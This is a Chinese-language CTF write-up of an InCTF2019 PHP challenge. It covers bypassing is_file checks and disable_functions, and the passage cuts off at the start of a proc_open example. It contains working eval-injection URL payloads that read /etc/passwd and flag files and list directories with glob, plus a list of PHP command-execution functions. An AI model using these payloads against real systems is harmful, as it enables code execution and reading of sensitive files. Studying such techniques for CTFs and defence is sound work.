# 从InCTF2019的一道题学习disable_function_bypass
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
前段时间做了一道InCTF2019的几道Web题，觉得里面涉及的PHP disable function
bypass和字符串拼接特性挺有意思的，所以自己搭建了环境复现了下，并且在这里记录一下。
## PHP+1
打开题目直接得到源码：
    ";
              return true;
              break;
          }
      }
      $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
      unset($blacklist);
      return false;
    }
    $thisfille=$_GET['thisfile'];
    if(is_file($thisfille)){
      echo "You can't use inner file" . "";
    }
    else{
      if(file_exists($thisfille)){
        if(check()){
          echo "Naaah" . "";
        }else{
          eval($input);
        }
      }else{
        echo "File doesn't exist" . "";
      }
    }
    function iterate($ass){
        foreach($ass as $hole){
            echo "AssHole";
        }
    }
    highlight_file(__FILE__);
    ?>
ps： 修正符`m`表示 将字符串视为多行,不管是那行都能匹配;
先分析下代码主要的执行流程：
（1）接受两个get请求参数，一个`input`，另一个`thisfile`，分别赋值给`$input`和`$thisfille`（注意拼写，两个l）；  
（2）第一层：传入的`$thisfille`需要同时满足`is_file($thisfille)`为`false`，`file_exists($thisfile)`为`true`；  
（3）第二层：如果`file_exists($thisfile)`为`true`，则进行`check()`函数检查；  
（4）`check()`函数中过滤了很多函数。
#####  第一层 is_file和file_exists绕过
`is_file`函数用来判断文件是否存在并且检查指定的文件名是否是正常的文件；
`file_exists`函数判断文件是否存在或者是目录是否存在;
`is_dir`函数判断目录是否存在。
也就是说，所以可以用一个目录路径来绕过`is_file`的检查，对任意目录，`is_file`会返回false，而`file_exists`会返回true。
#####  第二层 check函数绕过
在`check`函数中能看到一个看起来比较有趣的函数`get_defined_functions`，搜一下它的用法
输出的结果包含所有的php自带的built-in函数和用户自定义函数：
    array (size=2)
      'internal' => 
        array (size=1460)
          0 => string 'zend_version' (length=12)
          1 => string 'func_num_args' (length=13)
          2 => string 'func_get_arg' (length=12)
          3 => string 'func_get_args' (length=13)
          4 => string 'strlen' (length=6)
          5 => string 'strcmp' (length=6)
          ...... more elements
          1456 => string 'xdebug_code_coverage_started' (length=28)
          1457 => string 'xdebug_get_function_count' (length=25)
          1458 => string 'xdebug_dump_superglobals' (length=25)
          1459 => string 'xdebug_get_headers' (length=18)
      'user' => 
        array (size=1)
          0 => string 'foo' (length=3)
返回结果包括两个数组，内置（internal）和用户自定义的函数。可以通过`$arr['internal']`来访问系统内置的函数，通过`$arr['user']`来访问用户自定义的函数。
在这里`eval`函数并不属于php的内置函数，所以可以绕过上面代码中第7至11行的检查。
在第14行过滤的`eval`，`die`和`exit`都不属于函数，它们都属于 **语言构造器（ language construct ）** 。
这里稍微介绍一下`language
construct`。从本质上讲，function是一段代码，它的编写方式可以在脚本执行过程中多次使用和重复使用。它可能被设计成接受参数和返回值，也可能两者都不接受，函数可以由用户定义。language
construct本身是PHP语言的一部分，也就是说，它们不能由用户定义，也不能通过扩展加入到PHP语言中，PHP解析器不能进一步分解它们，而函数在被解析之前必须进一步分解，会被分解为language
construct。
language
construct通常会比对应的function更快。而且我们可以通过设置在PHP配置文件，如`php.ini`中通过`disable_functions`禁用一些函数，但是无法禁用language
construct。而且language construct不能作为回调函数被调用。
这是来自  对`eval`的解释：
`die`和`exit`一样，都是一个语言构造器，所以它们并不在函数`get_defined_functions`中返回的数组中。
而且在PHP中，`_()`也是一个函数，`_()`是`gettext`函数的别名。
所以`_`也会被`$blacklist`过滤掉。
回到正题，虽然`$blacklist`过滤掉了很多php内置函数，但是`eval`函数依然是可以使用的，所以可以通过`eval`来执行命令：
    ?input=eval("highlight".$thisfille[8]."fil"."e('/etc/passwd');");&thisfile=/lib/x86_64-linux-gnu
所以可以用`eval("sy"."stem('ls')")`来查看当前目录下的文件，但是并没有执行成功，因为`system`函数被禁用了。看一下有多少函数是`disable_functions`：
    ?input=eval("php"."info();");&thisfile=/var
看一下`disable_functions`这一栏，有很多函数不能用：
    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir
因为不知道flag到底在哪里，文件名是什么，所以肯定想看一下目录，一般flag文件会放在当前目录，根目录下或者是上一级目录里。常用的列目录的命令有：
    system('ls');
    scandir('/');
但是目前这些方法都被禁止了。所以我们要找到其他的相同功能的函数，一般这种题目考察的就是这些相对冷门的函数。
`glob`函数没有在上面的`disable_functions`之中，这个函数和`scandir`一样，可以用来查找文件，举个例子：
上面会输出当前目录下的所有以`.txt`为后缀的文件：
    Array ( 
        [0] => Readme.txt 
        [1] => source.txt 
        [2] => test.txt 
    )
所以用`print_r(glob("*"))`就可以列出当前目录下的所有文件：
    ?input=eval('print'.$thisfille[8].'r(glo'.'b("*"));');&thisfile=/lib/x86_64-linux-gnu
得到的结果是：
    Array ( 
        [0] => 1.html 
        [1] => 5.html 
        [2] => index.html 
        [3] => index.php 
        [4] => save2json.html 
        [5] => version_2.html 
    )
再看看根目录：
    Array ( 
        [0] => /bin 
        [1] => /boot 
        [2] => /daily_lock 
        [3] => /dev 
        [4] => /etc 
        [5] => /flag 
        [6] => /home 
        [7] => /initrd.img 
        [8] => /initrd.img.old 
        [9] => /lib 
        [10] => /lib64 
        [11] => /lost+found 
        [12] => /media 
        [13] => /mnt 
        [14] => /opt 
        [15] => /proc 
        [16] => /readFlag 
        [17] => /root 
        [18] => /run 
        [19] => /sbin 
        [20] => /srv 
        [21] => /sys 
        [22] => /tmp 
        [23] => /usr 
        [24] => /var 
        [25] => /vmlinuz 
        [26] => /vmlinuz.old 
    )
flag应该就在`/flag`文件或是`/readFlag`文件中。所以接下来就要读这两个文件。
一般读取文件有两种方式。一种是通过系统命令执行linux的读文件命令，另一种是直接调用php的文件读取函数。常见的文件读取函数有：
    file_get_contents
    readfile
    fread
    fopen
    highlight_file
    show_source
前面的四个都被禁掉了，但是最后的`highlight_file`和`show_source`都没有被禁掉，所以还可以用这两个函数来读取文件内容
    // show_source("/flag");
    ?input=eval('show'.$thisfille[8].'source("/flag");');&thisfile=/lib/x86_64-linux-gnu
    // highlight_file("/readFlag");
    ?input=eval('highlight'.$thisfille[8].'fil'.'e("/readFlag");');&thisfile=/lib/x86_64-linux-gnu
发现什么输出都没有，猜测可能是普通用户根本就没有read的权限。如果不能读的话，猜测这可能是一个可执行文件，所以需要命令执行函数来执行该文件，该文件会输出flag内容。但是这里有两个flag，显然其中一个是用来迷惑我们的，但是目前还没有办法判断哪个是真的flag。
php中比较常见的命令执行函数有：
    exec — 执行一个外部程序
    passthru — 执行外部程序并且显示原始输出
    proc_open — 执行一个命令，并且打开用来输入/输出的文件指针
    pcntl_exec - 在当前进程空间执行指定程序
    shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
    system — 执行外部程序，并且显示输出
    popen - 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生
    ob_start - 打开输出控制缓冲
    mail - 发送邮件
这些函数的具体用法可以参考chybeta师傅的文章：
>
> [php代码/命令执行漏洞](//chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)
> )
这些函数中，有两个没有被ban，`ob_start`和`proc_open`。
**proc_open** 函数的具体用法可以参考： 
语法：`resource proc_open ( string $cmd , array $descriptorspec , array &$pipes
[, string $cwd [, array $env [, array $other_options ]]] )`
`proc_open`会执行一个命令，并且会打开用来输入/输出的文件指针，输出在`$pipes[1]`中。
可以看一个最简单的例子，在读取`$pipes[1]`的时候还可以用`fgets`：
    <?php